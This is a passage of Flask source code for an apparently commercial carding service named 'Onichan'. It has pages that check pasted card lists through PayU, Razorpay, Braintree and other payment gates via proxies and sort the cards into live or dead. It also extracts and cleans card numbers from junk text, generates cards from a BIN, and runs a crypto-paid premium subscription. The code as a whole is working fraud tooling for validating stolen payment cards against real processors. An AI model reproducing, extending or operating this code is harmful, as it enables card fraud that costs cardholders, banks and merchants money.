                                    progressBar.style.width = '100%';
                                }}
                            }} catch(parseErr) {{}}
                        }}
                        return processChunk();
                    }});
                }}
                return processChunk();
            }})
            .catch(function(err) {{
                progressWrap.style.display='none';
                btn.classList.remove('btn-checking');
                btnText.textContent = 'Check Cards';
                resultArea.innerHTML = '<div class="alert alert-danger">'+escapeHtml(err.message||'Network error')+'</div>';
            }});
            return false;
        }}
        </script>
    </body>
    </html>
    """)


@app.route('/user/payu', methods=['GET'])
@user_required
def user_payu():
    """Auto PayU - Check cards through PayU gate"""
    return render_template_string(f"""
    <html>
    <head><title>Auto PayU - Onichan</title>{USER_CSS}
    <style>
        @keyframes spin {{ 0%{{transform:rotate(0deg)}} 100%{{transform:rotate(360deg)}} }}
        @keyframes pulse {{ 0%,100%{{opacity:1}} 50%{{opacity:.5}} }}
        .spinner {{ width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-top:3px solid #fff;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block;vertical-align:middle;margin-right:10px; }}
        .btn-checking {{ pointer-events:none;opacity:0.85;position:relative; }}
        .progress-bar-wrap {{ background:rgba(255,255,255,0.1);border-radius:8px;height:6px;margin-top:12px;overflow:hidden;display:none; }}
        .progress-bar-fill {{ height:100%;background:linear-gradient(90deg,#ec4899,#8b5cf6,#3b82f6);border-radius:8px;transition:width 0.3s ease;width:0%; }}
        .card-result {{ animation:slideIn 0.3s ease-out; }}
        @keyframes slideIn {{ from{{opacity:0;transform:translateY(10px)}} to{{opacity:1;transform:translateY(0)}} }}
    </style>
    </head>
    <body>
        {get_user_sidebar('payu', 'Auto PayU')}
        <div class="main">
            <div class="header">
                <div style="display: flex; align-items: center; gap: 12px;">
                    <div style="width: 40px; height: 40px; background: linear-gradient(135deg, #10b981, #059669); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; font-size: 1.2em;">P</div>
                    <div>
                        <h1 style="margin: 0; font-size: 1.3em;">Auto PayU</h1>
                        <p style="margin: 0; opacity: 0.6; font-size: 0.85em;">Check cards through PayU payment gate</p>
                    </div>
                </div>
            </div>
            
            <form id="payuForm" onsubmit="return startCheck(event)">
                <div class="card">
                    <h2>Card Details</h2>
                    <div class="form-group">
                        <textarea name="cards" id="payuCards" rows="6" placeholder="Paste cards in any format&#10;4111111111111111|12|25|123" style="font-family: monospace;"></textarea>
                    </div>
                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                        <button type="button" class="btn btn-secondary" onclick="formatCards()" style="font-size: 0.85em;">Format</button>
                        <label class="btn btn-secondary" style="font-size: 0.85em; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;">
                            Upload
                            <input type="file" accept=".txt" onchange="loadFile(this)" style="display: none;">
                        </label>
                    </div>
                </div>
                
                <div class="card">
                    <h2>Proxy (Optional)</h2>
                    <div class="form-group">
                        <input type="text" name="proxy" placeholder="host:port or user:pass@host:port">
                    </div>
                </div>
                
                <button type="submit" id="checkBtn" class="btn btn-primary" style="width: 100%; padding: 14px; font-size: 1.05em; margin-bottom: 10px;">
                    <span id="btnText">Start Checking</span>
                </button>
                <div class="progress-bar-wrap" id="progressWrap">
                    <div class="progress-bar-fill" id="progressBar"></div>
                </div>
            </form>
            
            <div id="resultArea" style="margin-top: 20px;"></div>
        </div>
        
        <script>
        function formatCards() {{
            var ta = document.getElementById('payuCards');
            var lines = ta.value.split('\\n');
            var formatted = [];
            for (var i = 0; i < lines.length; i++) {{
                var line = lines[i].trim();
                if (!line) continue;
                line = line.replace(/\\s+/g, '|').replace(/\\//g, '|');
                var parts = line.split('|');
                if (parts.length >= 4) formatted.push(parts[0]+'|'+parts[1]+'|'+parts[2]+'|'+parts[3]);
                else formatted.push(line);
            }}
            ta.value = formatted.join('\\n');
        }}
        function loadFile(input) {{
            if (input.files && input.files[0]) {{
                var reader = new FileReader();
                reader.onload = function(e) {{ document.getElementById('payuCards').value = e.target.result; }};
                reader.readAsText(input.files[0]);
            }}
        }}
        function escapeHtml(t) {{ var d=document.createElement('div'); d.textContent=t; return d.innerHTML; }}

        function renderResults(results) {{
            var live=0,dead=0,other=0,total=results.length;
            var html = '';
            for (var i=0;i<results.length;i++) {{
                var r = results[i];
                var cat = r.category||'UNKNOWN';
                if (cat==='LIVE') live++;
                else if (cat==='DEAD'||cat==='DECLINED'||cat==='EXPIRED') dead++;
                else other++;
                var color,icon,bg;
                if (cat==='LIVE') {{ color='#22c55e'; icon='&#10003;'; bg='rgba(34,197,94,0.15)'; }}
                else if (cat==='DEAD'||cat==='DECLINED'||cat==='EXPIRED') {{ color='#ef4444'; icon='&#10007;'; bg='rgba(239,68,68,0.15)'; }}
                else {{ color='#f59e0b'; icon='&#8264;'; bg='rgba(245,158,11,0.15)'; }}
                html += '<div class="card-result" style="background:'+bg+';border-left:3px solid '+color+';padding:12px 15px;margin-bottom:8px;border-radius:0 8px 8px 0;">'
                    +'<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">'
                    +'<div><span style="color:'+color+';font-weight:bold;font-size:1.1em;">'+icon+'</span>'
                    +'<code style="margin-left:8px;font-size:0.95em;">'+escapeHtml(r.masked||'N/A')+'</code></div>'
                    +'<span style="color:'+color+';font-weight:600;font-size:0.85em;">'+cat+'</span></div>'
                    +'<div style="margin-top:6px;font-size:0.85em;opacity:0.85;">'+escapeHtml(r.message||'N/A')+'</div>'
                    +'<div style="margin-top:4px;font-size:0.8em;opacity:0.65;display:flex;gap:15px;flex-wrap:wrap;">'
                    +'<span>'+escapeHtml(r.scheme||'N/A')+'</span><span>'+escapeHtml(r.bank||'N/A')+'</span>'
                    +'<span>'+escapeHtml(r.country||'N/A')+'</span><span>'+(r.time||0)+'s</span></div></div>';
            }}
            var statsHtml = '<div style="display:flex;gap:15px;flex-wrap:wrap;margin-bottom:20px;">'
                +'<div style="background:rgba(34,197,94,0.2);border:1px solid rgba(34,197,94,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#22c55e;">'+live+'</div><div style="font-size:0.8em;opacity:0.7;">Live</div></div>'
                +'<div style="background:rgba(239,68,68,0.2);border:1px solid rgba(239,68,68,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#ef4444;">'+dead+'</div><div style="font-size:0.8em;opacity:0.7;">Dead</div></div>'
                +'<div style="background:rgba(245,158,11,0.2);border:1px solid rgba(245,158,11,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#f59e0b;">'+other+'</div><div style="font-size:0.8em;opacity:0.7;">Other</div></div>'
                +'<div style="background:rgba(59,130,246,0.2);border:1px solid rgba(59,130,246,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#3b82f6;">'+total+'</div><div style="font-size:0.8em;opacity:0.7;">Total</div></div></div>';
            return '<div class="card"><h2 style="margin-bottom:15px;">Results</h2>'+statsHtml+html+'</div>';
        }}

        function startCheck(e) {{
            e.preventDefault();
            var btn = document.getElementById('checkBtn');
            var btnText = document.getElementById('btnText');
            var progressWrap = document.getElementById('progressWrap');
            var progressBar = document.getElementById('progressBar');
            var resultArea = document.getElementById('resultArea');

            btn.classList.add('btn-checking');
            btnText.innerHTML = '<span class="spinner"></span> Checking...';
            progressWrap.style.display = 'block';
            progressBar.style.width = '0%';
            resultArea.innerHTML = '';

            var animInterval = setInterval(function() {{
                var w = parseFloat(progressBar.style.width)||0;
                if (w < 90) progressBar.style.width = (w + Math.random()*8) + '%';
            }}, 500);

            var formData = new FormData(document.getElementById('payuForm'));
            fetch('/api/check/payu', {{ method:'POST', body:formData }})
            .then(function(resp) {{ return resp.json().then(function(data) {{ return {{ok:resp.ok, data:data}}; }}); }})
            .then(function(res) {{
                clearInterval(animInterval);
                progressBar.style.width = '100%';
                setTimeout(function() {{ progressWrap.style.display='none'; }}, 400);
                btn.classList.remove('btn-checking');
                btnText.textContent = 'Start Checking';
                if (!res.ok) {{
                    resultArea.innerHTML = '<div class="alert alert-danger">'+escapeHtml(res.data.error||'Unknown error')+'</div>';
                }} else {{
                    resultArea.innerHTML = renderResults(res.data.results||[]);
                }}
            }})
            .catch(function(err) {{
                clearInterval(animInterval);
                progressWrap.style.display='none';
                btn.classList.remove('btn-checking');
                btnText.textContent = 'Start Checking';
                resultArea.innerHTML = '<div class="alert alert-danger">Network error: '+escapeHtml(err.message)+'</div>';
            }});
            return false;
        }}
        </script>
    </body>
    </html>
    """)


@app.route('/user/cleaner', methods=['GET', 'POST'])
@user_required
def user_cleaner():
    """User CC Cleaner page"""
    result_html = ""
    cleaned_cards = ""
    
    if request.method == 'POST':
        text = request.form.get('text', '').strip()
        action = request.form.get('action', 'extract')
        
        if not text:
            result_html = '<div class="alert alert-danger">Please enter text to process</div>'
        else:
            try:
                from modules.cc_cleaner import extract_cards_from_junk, clean_and_format_cards, remove_duplicates, get_statistics
                
                if action == 'extract':
                    cards = extract_cards_from_junk(text)
                    if cards:
                        cleaned_cards = '\\n'.join([f"{c['cc']}|{c['mm']}|{c['yy']}|{c['cvv']}" for c in cards])
                        result_html = f'''
                        <div class="result-box" style="background: linear-gradient(135deg, rgba(34,197,94,0.2), rgba(16,185,129,0.2)); border: 1px solid #22c55e; padding: 20px; border-radius: 10px; margin-top: 20px;">
                            <h3 style="color: #22c55e; margin-bottom: 15px;">Extracted {len(cards)} Cards</h3>
                            <textarea style="width: 100%; height: 200px; background: rgba(0,0,0,0.3); color: #fff; border: 1px solid #333; border-radius: 5px; padding: 10px; font-family: monospace;">{cleaned_cards}</textarea>
                        </div>
                        '''
                    else:
                        result_html = '<div class="alert alert-danger">No valid cards found in the text</div>'
                
                elif action == 'clean':
                    cards = clean_and_format_cards(text)
                    if cards:
                        cleaned_cards = '\\n'.join(cards)
                        result_html = f'''
                        <div class="result-box" style="background: linear-gradient(135deg, rgba(34,197,94,0.2), rgba(16,185,129,0.2)); border: 1px solid #22c55e; padding: 20px; border-radius: 10px; margin-top: 20px;">
                            <h3 style="color: #22c55e; margin-bottom: 15px;">Cleaned {len(cards)} Cards</h3>
                            <textarea style="width: 100%; height: 200px; background: rgba(0,0,0,0.3); color: #fff; border: 1px solid #333; border-radius: 5px; padding: 10px; font-family: monospace;">{cleaned_cards}</textarea>
                        </div>
                        '''
                    else:
                        result_html = '<div class="alert alert-danger">No valid cards to clean</div>'
                
                elif action == 'dedupe':
                    cards = remove_duplicates(text)
                    if cards:
                        cleaned_cards = '\\n'.join(cards)
                        result_html = f'''
                        <div class="result-box" style="background: linear-gradient(135deg, rgba(34,197,94,0.2), rgba(16,185,129,0.2)); border: 1px solid #22c55e; padding: 20px; border-radius: 10px; margin-top: 20px;">
                            <h3 style="color: #22c55e; margin-bottom: 15px;">{len(cards)} Unique Cards</h3>
                            <textarea style="width: 100%; height: 200px; background: rgba(0,0,0,0.3); color: #fff; border: 1px solid #333; border-radius: 5px; padding: 10px; font-family: monospace;">{cleaned_cards}</textarea>
                        </div>
                        '''
                    else:
                        result_html = '<div class="alert alert-danger">No cards found to deduplicate</div>'
                
                elif action == 'stats':
                    stats = get_statistics(text)
                    result_html = f'''
                    <div class="result-box" style="background: linear-gradient(135deg, rgba(99,102,241,0.2), rgba(139,92,246,0.2)); border: 1px solid #6366f1; padding: 20px; border-radius: 10px; margin-top: 20px;">
                        <h3 style="color: #a78bfa; margin-bottom: 15px;">Card Statistics</h3>
                        <p><strong>Total Cards:</strong> {stats.get('total', 0)}</p>
                        <p><strong>Unique Cards:</strong> {stats.get('unique', 0)}</p>
                        <p><strong>Duplicates:</strong> {stats.get('duplicates', 0)}</p>
                        <p><strong>Visa:</strong> {stats.get('visa', 0)}</p>
                        <p><strong>Mastercard:</strong> {stats.get('mastercard', 0)}</p>
                        <p><strong>AMEX:</strong> {stats.get('amex', 0)}</p>
                        <p><strong>Discover:</strong> {stats.get('discover', 0)}</p>
                        <p><strong>Other:</strong> {stats.get('other', 0)}</p>
                    </div>
                    '''
            except Exception as e:
                result_html = f'<div class="alert alert-danger">Error: {str(e)[:100]}</div>'
    
    return render_template_string(f"""
    <html>
    <head><title>CC Cleaner - Onichan</title>{USER_CSS}</head>
    <body>
        {get_user_sidebar('cleaner', 'CC Cleaner')}
        <div class="main">
            <div class="header">
                <h1>CC Cleaner & Extractor</h1>
            </div>
            
            <div class="card">
                <h2>Extract Cards</h2>
                <p style="opacity: 0.7; margin-bottom: 20px;">Extract card numbers from junk text</p>
                <form method="POST">
                    <input type="hidden" name="action" value="extract">
                    <div class="form-group">
                        <label>Paste Text With Cards</label>
                        <textarea name="text" rows="6" placeholder="Paste any text containing card numbers..." required style="width: 100%; background: rgba(255,255,255,0.05); color: #fff; border: 1px solid #333; border-radius: 8px; padding: 12px;"></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Extract Cards</button>
                </form>
            </div>
            
            <div class="card">
                <h2>Clean & Format</h2>
                <p style="opacity: 0.7; margin-bottom: 20px;">Clean and format cards to CC|MM|YY|CVV</p>
                <form method="POST">
                    <input type="hidden" name="action" value="clean">
                    <div class="form-group">
                        <label>Cards (any format)</label>
                        <textarea name="text" rows="6" placeholder="4111111111111111 12/25 123&#10;5500000000000004|01|26|999" required style="width: 100%; background: rgba(255,255,255,0.05); color: #fff; border: 1px solid #333; border-radius: 8px; padding: 12px;"></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Clean Cards</button>
                </form>
            </div>
            
            <div class="card">
                <h2>Remove Duplicates</h2>
                <form method="POST">
                    <input type="hidden" name="action" value="dedupe">
                    <div class="form-group">
                        <label>Cards List</label>
                        <textarea name="text" rows="6" placeholder="Paste cards to remove duplicates..." required style="width: 100%; background: rgba(255,255,255,0.05); color: #fff; border: 1px solid #333; border-radius: 8px; padding: 12px;"></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Remove Duplicates</button>
                </form>
            </div>
            
            <div class="card">
                <h2>Get Statistics</h2>
                <form method="POST">
                    <input type="hidden" name="action" value="stats">
                    <div class="form-group">
                        <label>Cards List</label>
                        <textarea name="text" rows="6" placeholder="Paste cards to analyze..." required style="width: 100%; background: rgba(255,255,255,0.05); color: #fff; border: 1px solid #333; border-radius: 8px; padding: 12px;"></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Get Stats</button>
                </form>
            </div>
            
            {result_html}
        </div>
    </body>
    </html>
    """)


@app.route('/api/binlookup', methods=['POST'])
def api_binlookup():
    """API endpoint for BIN lookup - returns JSON only"""
    try:
        data = request.get_json() or {}
        bin_number = data.get('bin', '').strip()
        bin_number = ''.join(c for c in bin_number if c.isdigit())[:8]
        
        if not bin_number or len(bin_number) < 6:
            return jsonify({'error': 'Invalid BIN - must be at least 6 digits'})
        
        from modules.gate_checker import get_bin_info
        result = get_bin_info(bin_number)
        
        if result:
            return jsonify({
                'success': True,
                'bin': result.get('bin', bin_number),
                'brand': result.get('brand', 'Unknown'),
                'type': result.get('type', 'Unknown'),
                'level': result.get('level', 'Unknown'),
                'bank': result.get('bank', 'Unknown'),
                'country': result.get('country', 'Unknown'),
                'country_code': result.get('country_code', 'XX'),
                'emoji': result.get('emoji', '')
            })
        else:
            return jsonify({'error': 'BIN not found in database'})
    except Exception as e:
        return jsonify({'error': f'Lookup failed: {str(e)[:50]}'})

@app.route('/api/generate', methods=['POST'])
def api_generate():
    """API endpoint for CC generation - returns JSON only"""
    try:
        data = request.get_json() or {}
        bin_number = data.get('bin', '').strip()
        bin_number = ''.join(c for c in bin_number if c.isdigit())
        
        try:
            count = min(int(data.get('count', 10)), 50)
        except:
            count = 10
        
        month = data.get('month', '').strip() or None
        year = data.get('year', '').strip() or None
        cvv = data.get('cvv', '').strip() or None
        
        if month and month.lower() == 'rnd':
            month = None
        if year and year.lower() == 'rnd':
            year = None
        if cvv and cvv.lower() == 'rnd':
            cvv = None
        
        if not bin_number or len(bin_number) < 6:
            return jsonify({'error': 'Invalid BIN - must be at least 6 digits'})
        
        from modules.cc_generator import generate_cards
        generated = generate_cards(bin_number, count, month, year, cvv)
        cards = [f"{c['cc']}|{c['mm']}|{c['yy']}|{c['cvv']}" for c in generated]
        
        return jsonify({'cards': cards})
    except Exception as e:
        return jsonify({'error': f'Generation failed: {str(e)[:50]}'})

@app.route('/api/extension/validate_key', methods=['POST', 'OPTIONS'])
def api_extension_validate_key():
    """Validate an Onichan Bypasser extension activation key."""
    if request.method == 'OPTIONS':
        resp = jsonify({'ok': True})
        resp.headers['Access-Control-Allow-Origin'] = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return resp
    try:
        data = request.get_json(silent=True) or {}
        key = (data.get('key') or '').strip()
        if not key:
            resp = jsonify({'valid': False, 'error': 'No key provided'})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 400
        from modules.database import validate_extension_key
        result = validate_extension_key(key)
        resp = jsonify(result)
        resp.headers['Access-Control-Allow-Origin'] = '*'
        return resp
    except Exception as e:
        resp = jsonify({'valid': False, 'error': str(e)})
        resp.headers['Access-Control-Allow-Origin'] = '*'
        return resp, 500


@app.route('/health')
def health():
    return {'status': 'ok', 'bot': 'running'}


@app.route('/webhook/coinbase', methods=['POST'])
def coinbase_webhook():
    """Handle Coinbase Commerce webhook"""
    try:
        from modules.coinbase_commerce import process_webhook, verify_webhook_signature
        import os
        
        webhook_secret = os.environ.get('COINBASE_COMMERCE_WEBHOOK_SECRET', '')
        
        signature = request.headers.get('X-CC-Webhook-Signature', '')
        payload = request.get_data()
        
        if webhook_secret and signature:
            if not verify_webhook_signature(payload, signature, webhook_secret):
                print("[Webhook] ERROR: Invalid signature")
                return jsonify({"error": "Invalid signature"}), 403
        
        payload_json = request.get_json() or {}
        result = process_webhook(payload_json, signature)
        
        if result.get("success") and result.get("action") == "premium_activated":
            pending_notifications.append({
                "user_id": result.get("user_id"),
                "plan_key": result.get("plan_key"),
                "message": f"Premium activated via Coinbase Commerce"
            })
            print(f"[Webhook] Premium activated: User {result.get('user_id')}, Plan: {result.get('plan_key')}")
            return jsonify({"status": "ok"}), 200
        
        print(f"[Webhook] Action: {result.get('action')}")
        return jsonify({"status": "ok"}), 200
            
    except Exception as e:
        print(f"[Webhook] Exception: {str(e)}")
        return jsonify({"error": str(e)}), 500


@app.route('/webhook/coinpayments', methods=['POST'])
def coinpayments_webhook():
    """Legacy CoinPayments endpoint - redirects to Coinbase"""
    return coinbase_webhook()


@app.route('/ipn', methods=['POST'])
def coinpayments_ipn():
    """Legacy IPN endpoint - redirects to Coinbase webhook"""
    return coinbase_webhook()


@app.route('/webhook/oxapay', methods=['POST'])
def oxapay_webhook():
    """Handle OxaPay payment webhook callbacks for automatic premium activation"""
    try:
        raw_body = request.get_data(as_text=True)
        
        hmac_header = request.headers.get('HMAC', request.headers.get('hmac', ''))
        oxapay_key = os.environ.get("OXAPAY_API_KEY", "")
        if hmac_header and oxapay_key:
            import hmac as hmac_mod
            import hashlib
            calculated = hmac_mod.new(oxapay_key.encode('utf-8'), raw_body.encode('utf-8'), hashlib.sha512).hexdigest()
            if not hmac_mod.compare_digest(calculated, hmac_header):
                print(f"[OxaPay Webhook] HMAC verification failed!")
                return jsonify({"error": "Invalid signature"}), 403
            print(f"[OxaPay Webhook] HMAC verified successfully")
        
        data = json.loads(raw_body) if raw_body else {}
        print(f"[OxaPay Webhook] Received: {json.dumps(data)[:500]}")
        
        oxa_status = str(data.get("status", "")).lower()
        track_id = data.get("trackId", data.get("track_id", ""))
        order_id = data.get("orderId", data.get("order_id", ""))
        
        if oxa_status in ["paid", "confirming", "confirmed", "complete", "sending"]:
            from modules.oxapay import get_pending_payments, confirm_payment, activate_premium, PREMIUM_PLANS
            
            all_pending = get_pending_payments()
            pending = None
            for p in all_pending:
                if (track_id and p.get("track_id") == str(track_id)) or \
                   (order_id and p.get("order_id") == str(order_id)):
                    pending = p
                    break
            
            if pending:
                user_id = pending.get("user_id")
                plan_key = pending.get("plan_key")
                username = pending.get("username", "User")
                
                result = activate_premium(user_id, plan_key, username, "OxaPay Crypto")
                
                if result.get("success"):
                    confirm_payment(pending.get("order_id"), user_id, plan_key)
                    print(f"[OxaPay Webhook] Premium activated for user {user_id} - {plan_key}")
                    
                    try:
                        import asyncio
                        from telegram import Bot
                        bot_token = os.environ.get("BOT_TOKEN", "")
                        if bot_token:
                            plan = PREMIUM_PLANS.get(plan_key, {})
                            msg = (
                                f"✅ <b>PAYMENT CONFIRMED!</b>\n\n"
                                f"📦 Plan: {plan.get('name', plan_key)}\n"
                                f"⏰ Duration: {plan.get('duration_days', 0)} days\n\n"
                                f"🎉 Your premium is now active!\n"
                                f"Enjoy all premium features!"
                            )
                            bot = Bot(token=bot_token)
                            loop = asyncio.new_event_loop()
                            loop.run_until_complete(bot.send_message(chat_id=user_id, text=msg, parse_mode="HTML"))
                            loop.close()
                    except Exception as notify_err:
                        print(f"[OxaPay Webhook] Notification error: {notify_err}")
                    
                    return jsonify({"status": "ok", "message": "Premium activated"}), 200
                else:
                    print(f"[OxaPay Webhook] Activation failed: {result.get('error')}")
                    return jsonify({"status": "error", "message": result.get("error")}), 500
            else:
                print(f"[OxaPay Webhook] No pending payment found for track_id={track_id}, order_id={order_id}")
                return jsonify({"status": "ok", "message": "No matching pending payment"}), 200
        else:
            print(f"[OxaPay Webhook] Status not paid: {oxa_status}")
            return jsonify({"status": "ok", "message": f"Status: {oxa_status}"}), 200
            
    except Exception as e:
        print(f"[OxaPay Webhook] Error: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": str(e)}), 500




@app.route('/webhook/easebuzz/success', methods=['POST'])
def easebuzz_success():
    """Handle Easebuzz payment success callback"""
    try:
        from modules.easebuzz import process_webhook, verify_response_hash
        from modules.database import set_premium_sync, add_user_sync
        from datetime import datetime, timedelta
        
        data = request.form.to_dict()
        print(f"[Easebuzz] Success callback: {data.get('txnid')}, status: {data.get('status')}")
        
        result = process_webhook(data)
        
        if result.get("success"):
            user_id = result.get("user_id")
            plan_key = result.get("plan_key")
            duration_days = result.get("duration_days", 7)
            
            try:
                add_user_sync(int(user_id), None, "approved")
            except:
                pass
            set_premium_sync(int(user_id), duration_days)
            
            pending_notifications.append({
                "user_id": user_id,
                "plan_key": plan_key,
                "message": f"Premium activated via Easebuzz UPI",
                "txnid": result.get("txnid"),
                "amount": result.get("amount")
            })
            
            print(f"[Easebuzz] Premium activated: User {user_id}, Plan: {plan_key}, Days: {duration_days}")
            
            return render_template_string("""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Payment Successful</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body { font-family: Arial; background: linear-gradient(135deg, #1a1a2e, #16213e); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
                    .box { background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; }
                    .success { color: #00ff88; font-size: 60px; }
                    h1 { color: #00ff88; }
                    p { color: #ccc; }
                    .btn { display: inline-block; background: #e94560; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none; margin-top: 20px; }
                </style>
            </head>
            <body>
                <div class="box">
                    <div class="success">✓</div>
                    <h1>Payment Successful!</h1>
                    <p>Your premium has been activated.</p>
                    <p><strong>Transaction:</strong> {{ txnid }}</p>
                    <p><strong>Amount:</strong> ₹{{ amount }}</p>
                    <a href="https://t.me/onichan_checker_bot" class="btn">Return to Bot</a>
                </div>
            </body>
            </html>
            """, txnid=result.get("txnid"), amount=result.get("amount"))
        else:
            return render_template_string("""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Payment Failed</title>
                <style>
                    body { font-family: Arial; background: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
                    .box { background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; text-align: center; }
                    .error { color: #e94560; font-size: 60px; }
                    h1 { color: #e94560; }
                </style>
            </head>
            <body>
                <div class="box">
                    <div class="error">✗</div>
                    <h1>Payment Failed</h1>
                    <p>{{ error }}</p>
                    <a href="https://t.me/onichan_checker_bot" style="color: #e94560;">Return to Bot</a>
                </div>
            </body>
            </html>
            """, error=result.get("error", "Unknown error"))
            
    except Exception as e:
        print(f"[Easebuzz] Exception: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": str(e)}), 500


@app.route('/webhook/easebuzz/failure', methods=['POST'])
def easebuzz_failure():
    """Handle Easebuzz payment failure callback"""
    try:
        data = request.form.to_dict()
        txnid = data.get('txnid', 'Unknown')
        error = data.get('error_Message', 'Payment was cancelled or failed')
        print(f"[Easebuzz] Payment failed: {txnid}, error: {error}")
        
        return render_template_string("""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Payment Failed</title>
            <style>
                body { font-family: Arial; background: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
                .box { background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; }
                .error { color: #e94560; font-size: 60px; }
                h1 { color: #e94560; }
                p { color: #ccc; }
                .btn { display: inline-block; background: #e94560; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="box">
                <div class="error">✗</div>
                <h1>Payment Failed</h1>
                <p>{{ error }}</p>
                <p>Please try again or contact support.</p>
                <a href="https://t.me/onichan_checker_bot" class="btn">Return to Bot</a>
            </div>
        </body>
        </html>
        """, error=error)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/webhook/test', methods=['GET', 'POST'])
def test_webhook():
    """Test endpoint for webhook"""
    return jsonify({
        "status": "ok",
        "message": "Webhook endpoint is working",
        "method": request.method
    })


@app.route('/notifications')
def get_notifications():
    """Get pending premium activation notifications (for bot polling)"""
    global pending_notifications
    notifications = pending_notifications.copy()
    pending_notifications = []
    return jsonify(notifications)


# ============================================================
# TOOLS PAGES - CC Checker, Generator, Auto Hitter, Cleaner
# ============================================================

TOOLS_SIDEBAR = """
<div class="sidebar">
    <h2>Onichan Tools</h2>
    <a href="/admin" onclick="closeSidebar()">Dashboard</a>
    <hr style="border-color: rgba(255,255,255,0.1); margin: 15px 0;">
    <a href="/tools/checker" {checker_active} onclick="closeSidebar()">CC Checker</a>
    <a href="/tools/generator" {generator_active} onclick="closeSidebar()">Card Generator</a>
    <a href="/admin/autohitter" {autohitter_active} onclick="closeSidebar()">Auto Hitter</a>
    <a href="/tools/cleaner" {cleaner_active} onclick="closeSidebar()">CC Cleaner</a>
    <hr style="border-color: rgba(255,255,255,0.1); margin: 15px 0;">
    <a href="/admin/users" onclick="closeSidebar()">Users</a>
    <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
    <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
    <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
    <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
    <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
</div>
"""

def get_tools_sidebar(active_page=""):
    return TOOLS_SIDEBAR.format(
        checker_active='class="active"' if active_page == "checker" else "",
        generator_active='class="active"' if active_page == "generator" else "",
        autohitter_active='class="active"' if active_page == "autohitter" else "",
        cleaner_active='class="active"' if active_page == "cleaner" else ""
    )

@app.route('/tools/checker', methods=['GET', 'POST'])
@admin_required
def tools_checker():
    result = None
    cards_input = ""
    gate = "st"
    
    if request.method == 'POST':
        cards_input = request.form.get('cards', '').strip()
        gate = request.form.get('gate', 'st')
        
        if cards_input:
            import asyncio
            from modules.gate_checker import check_card_php
            from modules.rpp_gate import check_razorpay
            from modules.braintree_gate import check_braintree
            
            lines = [l.strip() for l in cards_input.split('\n') if l.strip()][:10]
            results = []
            
            for line in lines:
                parts = line.replace('/', '|').replace(' ', '|').split('|')
                if len(parts) >= 4:
                    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                    
                    try:
                        if gate == 'rz':
                            res = _run_async(check_razorpay(cc, mm, yy, cvv))
                            results.append({
                                'card': f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}",
                                'status': res.get('status', 'ERROR'),
                                'response': res.get('response', 'Unknown')
                            })
                        elif gate == 'b3':
                            res = _run_async(check_braintree(cc, mm, yy, cvv))
                            results.append({
                                'card': f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}",
                                'status': res.get('status', 'ERROR'),
                                'response': res.get('response', 'Unknown')
                            })
                        else:
                            res = check_card_php(gate, cc, mm, yy, cvv, 0)
                            results.append({
                                'card': f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}",
                                'status': res.get('status', 'ERROR'),
                                'response': res.get('response', 'Unknown')
                            })
                    except Exception as e:
                        results.append({
                            'card': f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}",
                            'status': 'ERROR',
                            'response': str(e)[:50]
                        })
            
            result = results
    
    results_html = ""
    if result:
        for r in result:
            status_class = "color: #4ade80;" if r['status'] in ['CHARGED', 'APPROVED', 'CVV'] else "color: #e94560;"
            results_html += f"""
            <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 10px; margin: 10px 0;">
                <div style="font-family: monospace; font-size: 1.1em;">{r['card']}</div>
                <div style="{status_class} font-weight: bold; margin-top: 5px;">{r['status']}</div>
                <div style="opacity: 0.7; font-size: 0.9em;">{r['response']}</div>
            </div>
            """
    
    return render_template_string(f"""
    <html>
    <head>
        <title>CC Checker - Onichan Tools</title>
        {ADMIN_CSS}
    </head>
    <body>
